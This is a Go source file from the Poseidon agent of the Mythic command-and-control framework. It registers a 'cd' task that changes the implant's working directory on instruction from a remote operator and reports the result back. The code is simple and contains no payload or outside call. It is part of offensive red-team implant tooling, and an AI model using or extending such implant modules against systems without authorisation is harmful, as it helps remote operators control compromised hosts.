package cd

import (
	"fmt"
	"os"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
)


func init() {
	library.RegisterTask("cd", Run)
}

// Run - package function to run cd
func Run(task structs.Task) {
	err := os.Chdir(task.Params)
	msg := task.NewResponse()
	msg.Completed = true
	if err != nil {
		msg.SetError(err.Error())
	} else {
		msg.UserOutput = fmt.Sprintf("changed directory to: %s", task.Params)
	}
	task.Job.SendResponses <- msg
	return
}
